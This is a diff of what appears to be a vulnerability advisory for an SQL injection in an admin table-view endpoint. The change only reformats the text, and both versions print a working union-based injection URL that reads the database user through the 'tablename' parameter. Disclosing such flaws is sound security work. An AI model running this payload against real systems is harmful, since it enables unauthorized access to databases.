@@ -8,8 +8,8 @@ You can see that the $tablename parameter is directly taken from the user reques
 
 Vulnerable URL:http://localhost/admin/system.systemdatabackup/seetable?tablename=1
 
-Cookies are required for successful administrator login during exploit.Here is the SQL Injection payload:
+**Cookies are required for successful administrator login during exploit.** For example, here is the SQL Injection payload:
 
-'''python
+```markdown
 http://localhost/admin/system.systemdatabackup/seetable?tablename=1' union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,CONCAT(0x7e,(select user()),0x7e),21,22--+
-'''
+```
